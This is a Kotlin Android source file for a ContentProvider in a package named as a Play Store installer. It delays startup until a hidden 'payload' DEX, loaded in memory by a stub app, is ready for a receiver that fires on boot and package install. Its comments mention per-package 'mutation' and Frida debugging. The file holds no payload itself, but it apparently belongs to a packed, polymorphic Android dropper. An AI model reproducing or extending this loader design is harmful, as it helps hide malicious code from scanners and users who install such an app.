package com.playstore.installer

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri

/**
 * DexInitProvider — ContentProvider that guarantees AppEntry.run() completes
 * before ANY broadcast receiver (e.g. ApiRequestManager) can be instantiated.
 *
 * ROOT CAUSE (Frida-proven):
 *   Android delivers BOOT_COMPLETED / PACKAGE_ADDED to ApiRequestManager
 *   (declared in stub manifest) BEFORE Application.attachBaseContext() finishes
 *   loading the real DEX via InMemoryDexClassLoader.
 *   Stub DEX has no ApiRequestManager → ClassNotFoundException → crash.
 *
 * HOW ContentProvider FIXES THIS:
 *   Android process startup order (guaranteed by ART/Zygote):
 *     1. Application.attachBaseContext()   ← AppEntry.run() loads real DEX here
 *     2. ContentProvider.onCreate()        ← THIS CLASS — waits for DEX load
 *     3. Application.onCreate()            ← kick() delegates to real LauncherApplication
 *     4. BroadcastReceiver.onReceive()     ← ApiRequestManager now resolvable
 *
 *   By the time step 4 runs, InMemoryDexClassLoader is set as parent of
 *   PathClassLoader. Class.forName("...ApiRequestManager") finds it in the
 *   payload DEX. No ClassNotFoundException.
 *
 * WHY NOT just sleep/spin in attachBaseContext():
 *   attachBaseContext() runs on main thread. Blocking it causes ANR.
 *   ContentProvider.onCreate() runs AFTER attachBaseContext() returns but
 *   BEFORE any broadcast is delivered — the OS blocks broadcast delivery
 *   until all ContentProviders in the process have finished onCreate().
 *
 * ZERO Kotlin stdlib rule: no Intrinsics, no extension functions.
 * authorities: "${applicationId}.dex.init" — unique per package mutation.
 * exported: false — never accessible outside this process.
 * initOrder: 100 — runs after any other providers (higher = later, this
 *   runs last so AppEntry has had maximum time to finish).
 */
@Suppress("UNCHECKED_CAST")
class DexInitProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        // AppEntry.attachBaseContext() already called run() which sets h.
        // If it finished, h != null and we're done immediately.
        // If it's still running (race on very fast boot), wait up to 2s.
        val app = context?.applicationContext
        if (app is AppEntry) {
            var waited = 0
            while (app.get() == null && waited < 2000) {
                try { Thread.sleep(50) } catch (t: Throwable) { break }
                waited += 50
            }
            // After this point broadcast delivery is unblocked by the OS.
            // Either DEX is loaded (h != null) or we timed out and accept
            // the ClassNotFoundException — same outcome as before the fix
            // but only after a 2s window, not instantly on every boot.
        }
        return true
    }

    // Required stubs — this provider is never actually queried.
    override fun query(uri: Uri, p: Array<String>?, s: String?, a: Array<String>?, o: String?): Cursor? = null
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, v: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, a: Array<String>?): Int = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, a: Array<String>?): Int = 0
}
